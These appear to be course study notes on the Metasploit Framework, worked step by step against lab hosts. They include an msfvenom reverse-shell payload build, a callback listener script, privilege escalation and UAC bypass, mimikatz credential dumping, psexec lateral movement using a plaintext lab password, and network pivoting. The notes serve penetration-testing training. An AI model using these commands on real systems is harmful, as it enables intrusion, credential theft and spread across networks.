# Module 20: The Metasploit Framework

Getting Familiar with Metasploit

#### Setup and Work with MSF

Startin the database service and creating/initializing the MSF database:

```bash
kali@kali:~$ sudo msfdb init
```

Enabling the database server at boot:

```bash
kali@kali:~$ sudo systemctl enable postgresql
```

Launching the Metasploit Framework Console

```bash
kali@kali:~$ sudo msfconsole
```

Verifying the database connectivity:

```bash
msf6 > db_status
```

{% hint style="warning" %}
Use workspaces to keep your gathered data separate!
{% endhint %}

```bash
# Displaying current workspace
msf6 > workspace
* default
  demo

# Switching workspaces
msf6 > workspace demo
[*] Workspace: demo

# Creating a new workspace named pen200
msf6 > workspace -a pen200
[*] Added workspace: pen200
[*] Workspace: pen200
```

Populating the database:

{% code overflow="wrap" %}
```bash
msf6 > db_nmap
[*] Usage: db_nmap [--save | [--help | -h]] [nmap options]

msf6 > db_nmap -A 192.168.50.202
[*] Nmap: Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-28 03:48 EDT
[*] Nmap: Nmap scan report for 192.168.50.202
[*] Nmap: Host is up (0.11s latency).
[*] Nmap: Not shown: 993 closed tcp ports (reset)
[*] Nmap: PORT     STATE SERVICE       VERSION
[*] Nmap: 21/tcp   open  ftp?
...
[*] Nmap: 135/tcp  open  msrpc         Microsoft Windows RPC
[*] Nmap: 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp  open  microsoft-ds?
[*] Nmap: 3389/tcp open  ms-wbt-server Microsoft Terminal Services
...
[*] Nmap: 5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
...
[*] Nmap: 8000/tcp open  http          Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
...
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 67.72 seconds
```
{% endcode %}

Listing findings:

{% code overflow="wrap" %}
```bash
msf6 > hosts
Hosts
=====

address         mac  name  os_name       os_flavor  os_sp  purpose  info  comments
-------         ---  ----  -------       ---------  -----  -------  ----  --------
192.168.50.202             Windows 2016                    server

msf6 > services
Services
========

host            port  proto  name           state  info
----            ----  -----  ----           -----  ----
192.168.50.202  21    tcp    ftp            open
192.168.50.202  135   tcp    msrpc          open   Microsoft Windows RPC
192.168.50.202  139   tcp    netbios-ssn    open   Microsoft Windows netbios-ssn
192.168.50.202  445   tcp    microsoft-ds   open
192.168.50.202  3389  tcp    ms-wbt-server  open   Microsoft Terminal Services
192.168.50.202  5357  tcp    http           open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
192.168.50.202  8000  tcp    http           open   Golang net/http server Go-IPFS json-rpc or InfluxDB API

msf6 > services -p 8000
Services
========

host            port  proto  name  state  info
----            ----  -----  ----  -----  ----
192.168.50.202  8000  tcp    http  open   Golang net/http server Go-IPFS json-rpc or InfluxDB API
```
{% endcode %}

Viewing modules:

{% code overflow="wrap" %}
```bash
msf6 > show -h
[*] Valid parameters for the "show" command are: all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options
[*] Additional module-specific parameters are: missing, advanced, evasion, targets, actions
```
{% endcode %}

#### Auxiliary Modules

Listing all auxiliary modules:

```bash
msf6 > show auxiliary
```

Searching for specific types of modules in the auxiliary category:

```bash
msf6 > search type:auxiliary smb
```

Selecting a module found for use:

```bash
msf6 > use 56
msf6 auxiliary(scanner/smb/smb_version) > 
```

Getting information about the currently activated module:

```bash
msf6 auxiliary(scanner/smb/smb_version) > info
```

Listing _Basic Options_ for the module:

```bash
msf6 auxiliary(scanner/smb/smb_version) > show options
```

Setting option values:

```bash
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.50.202
msf6 auxiliary(scanner/smb/smb_version) > unset RHOSTS
msf6 auxiliary(scanner/smb/smb_version) > services -p 445 --rhosts
Services
========

host            port  proto  name          state  info
----            ----  -----  ----          -----  ----
192.168.50.202  445   tcp    microsoft-ds  open

RHOSTS => 192.168.50.202
```

Launching an exploit:

```bash
msf6 auxiliary(scanner/smb/smb_version) > run
```

Listing discovered vulnerabilities:

{% code overflow="wrap" %}
```bash
msf6 auxiliary(scanner/smb/smb_version) > vulns
Vulnerabilities
===============

Timestamp                Host            Name                         References
---------                ----            ----                         ----------
2022-07-28 10:17:41 UTC  192.168.50.202  SMB Signing Is Not Required  URL-https://support.microsoft.com/en-us/help/161372/how-to-enable-smb-signing-in-windows-nt,URL-https://support.microsoft.com/en-us/help/88
                                                                      7429/overview-of-server-message-block-signing
```
{% endcode %}

#### Exploit Modules

Same kind of deal as the Auxiliary modules except you want to pick an exploit and then set a payload.

### Using Metasploit Payloads

#### Staged vs Non-Staged Payloads

_Non-staged_: Sent in its entirety along with the exploit. These are generally more stable. The downside is the size will be bigger than other types.

_Staged_: Sent in two parts; the first contains a small primary payload that causes the victim machine to connect back to the attacker, transfer a larger secondary payload containing the rest of the shellcode, and then execute it.

Examples in Metasploit:

```bash
msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads
Compatible Payloads
===================

   #   Name                                              Disclosure Date  Rank    Check  Description
   -   ----                                              ---------------  ----    -----  -----------
...
   15  payload/linux/x64/shell/reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Stager
...
   20  payload/linux/x64/shell_reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Inline
...
```

The two payloads above only differ in the character following **shell** before **reverse\_tcp**. The **/shell/reverse\_tcp** is a staged payload. The **/shell\_reverse\_tcp** is a non-staged payload.

#### Meterpreter Payload

The _Meterpreter_ payload is a multi-function payload that can be dynamically extended at run-time. It resides entirely in memory and communication is encrypted by default.

Useful Meterpreter commands of note:

```bash
Command       Description
-------       -----------
sysinfo       Gets information about the remote system, such as OS
getuid        Get the user that the server is running as
shell         Drop into a system command shell
channel       Displays information or control active channels
help          Gets help
upload        Upload a file or directory
download      Download a file or directory
```

Running any command inside a meterpreter session prefixed with an `l` (lowercase L) will run on the local system rather than the remote system.

```bash
meterpreter > lpwd
/home/kali

meterpreter > lcd /home/kali/Downloads

meterpreter > lpwd
/home/kali/Downloads
```

#### Executable Payloads

Using msfvenom to list payloads with a filter:

```bash
kali@kali:~$ msfvenom -l payloads --platform windows --arch x64
```

{% hint style="info" %}
Netcat does not know how to handle staged payloads. If running a staged payload, use Metasploit's _multi/handler_ module.
{% endhint %}

Example usage of msfvenom:

{% code overflow="wrap" %}
```bash
kali@kali:~$ msfvenom -p php/reverse_tcp <OPTIONS=VALUES> -f <FORMAT> -o <OUTFILE>
kali@kali:~$ msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.4 LPORT=443 -f exe -o met.exe
```
{% endcode %}

### Performing Post-Exploitation with Metasploit

#### Core Meterpreter Post-Exploitation Features

```bash
meterpreter > idletime
User has been idel for: 9 mins 53 secs

meterpreter > shell
C:\Users\luiza> 

meterpreter > getuid
Server username: ITWK01\luiza

meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > ps
...
Process List
============
PID    PPID    Name    Arch    Session    User    Path
...

meterpreter > migrate 8052
[*] Migrating from 2552 to 8052...
[*] Migration completed successfullly.

# Creating a hidden process
meterpreter > execute -H -f notepad
Process 2720 created.

meterpreter > migrate 2720
[*] Migrating from 8052 to 2720...
[*] Migration completed successfully.

meterpreter > 
```

#### Post-Exploitation Modules

Getting integrity level and bypassing UAC starting from Meterpreter session:

```bash
meterpreter > ps
meterpreter > migrate 8044
meterpreter > getuid
Server username: ITWK01\offsec
meterpreter > shell
C:\Windows\system32 powershell -ep bypass
PS C:\Windows\system32> Import-Module NTObjectManager
PS C:\Windows\system32> Get-NtTokenIntegrityLevel
Medium
PS C:\Windows\system32> ^Z
Background channel 1? [y/N]  y

meterpreter > bg
[*] Backgrounding session 9...

msf6 exploit(multi/handler) > search UAC
msf6 exploit(multi/handler) > use exploit/windows/local/bypassuac_sdclt
msf6 exploit(multi/handler) > set SESSION 9
msf6 exploit(multi/handler) > set LHOST 192.168.119.4
msf6 exploit(multi/handler) > run

# Get back to EP bypass shell with NTObjectManager imported
PS C:\Windows\system32> Get-NtTokenIntegrityLevel
High
```

Loading extensions in Metasploit:

```bash
meterpreter > load kiwi
meterpreter > help
Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_livessp          Retrieve Live SSP creds
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)

meterpreter > creds_msv

```

#### Pivoting with Metasploit

Setting up a route through an open session:

```bash
# Gather network information to find a second network connected
PS C:\Windows\System32> ipconfig

# Background the session and create a route for it
meterpreter > bg
[*] Backgrounding session 12...

msf6 exploit(multi/handler) > route add 172.16.5.0/24 12
[*] Route added
msf6 exploit(multi/handler) > route print

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   172.16.5.0         255.255.255.0      Session 12

[*] There are currently no IPv6 routes defined.
```

Using credentials to pivot through our route:

```bash
msf6 auxiliary(scanner/portscan/tcp) > use exploit/windows/smb/psexec 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/smb/psexec) > set SMBUser luiza
SMBUser => luiza

msf6 exploit(windows/smb/psexec) > set SMBPass "BoccieDearAeroMeow1!"
SMBPass => BoccieDearAeroMeow1!

msf6 exploit(windows/smb/psexec) > set RHOSTS 172.16.5.200
RHOSTS => 172.16.5.200

msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp

msf6 exploit(windows/smb/psexec) > set LPORT 8000
LPORT => 8000

msf6 exploit(windows/smb/psexec) > run
```

Automated route creation:

```bash
# This requires us to remove our route.
msf6 exploit(windows/smb/psexec) > use multi/manage/autoroute
msf6 exploit(windows/smb/psexec) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information            Connection
  --  ----  ----                     -----------            ----------
  12         meterpreter x64/windows  ITWK01\luiza @ ITWK01  192.168.119.4:443 -> 127.0.0.1 ()

msf6 post(multi/manage/autoroute) > set session 12
session => 12

msf6 post(multi/manage/autoroute) > run
```

Combining routes with the _server/socks\_proxy_ auxiliary module to configure a SOCKS proxy. This allows applications outside of the MSF to tunnel through the pivot on port 1080 by default:

```bash
msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy 

msf6 auxiliary(server/socks_proxy) > show options

Module options (auxiliary/server/socks_proxy):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   SRVHOST   0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT   1080             yes       The port to listen on
   USERNAME                   no        Proxy username for SOCKS5 listener
   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server


msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
SRVHOST => 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set VERSION 5
VERSION => 5
msf6 auxiliary(server/socks_proxy) > run -j
[*] Auxiliary module running as background job 0.
[*] Starting the SOCKS proxy server

kali@kali:~$ tail -5 /etc/proxychains4.confg
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 1080

kali@kali:~$ sudo proxychains xfreerdp /v:172.16.5.200 /u:luiza
```

We can also port forward inside a meterpreter session via the _portfwd_ command:

```bash
msf6 auxiliary(server/socks_proxy) > sessions -i 12
[*] Starting interaction with 5...

meterpreter > portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]

OPTIONS:

    -h   Help banner.
    -i   Index of the port forward entry to interact with (see the "list" command).
    -l   Forward: local port to listen on. Reverse: local port to connect to.
    -L   Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p   Forward: remote port to connect to. Reverse: remote port to listen on.
    -r   Forward: remote host to connect to.
    -R   Indicates a reverse port forward.

meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.5.200
[*] Local TCP relay created: :3389 <-> 172.16.5.200:3389

kali@kali:~$ sudo xfreerdp /v:127.0.0.1 /u:luiza             
[08:09:25:307] [1314360:1314361] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[08:09:25:307] [1314360:1314361] [WARN][com.freerdp.crypto] - CN = itwk02
...
```

### Automating Metasploit

#### Resource Scripts

Creating a resource script to start a multi/handler listener for a non-staged Windows 64-bit Meterpreter payload:

{% code title="listener.rc" %}
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.119.4
set LPORT 443
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
run -z -j
```
{% endcode %}

Reading from the resource script via **msfconsole**:

```
kali@kali:~$ sudo msfconsole -r listener.rc
[sudo] password for kali:
...

[*] Processing listener.rc for ERB directives.
resource (listener.rc)> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (listener.rc)> set PAYLOAD windows/meterpreter/reverse_https
PAYLOAD => windows/meterpreter/reverse_https
resource (listener.rc)> set LHOST 192.168.119.4
LHOST => 192.168.119.4
resource (listener.rc)> set LPORT 443
LPORT => 443
resource (listener.rc)> set AutoRunScript post/windows/manage/migrate
AutoRunScript => post/windows/manage/migrate
resource (listener.rc)> set ExitOnSession false
ExitOnSession => false
resource (listener.rc)> run -z -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/handler) > 
[*] Started HTTPS reverse handler on https://192.168.119.4:443
```

If we don't want to use our own scripts, there are resource scripts provided from Metasploit as well! These can be found in the `/usr/share/metasploit-framework/scripts/resource` directory.
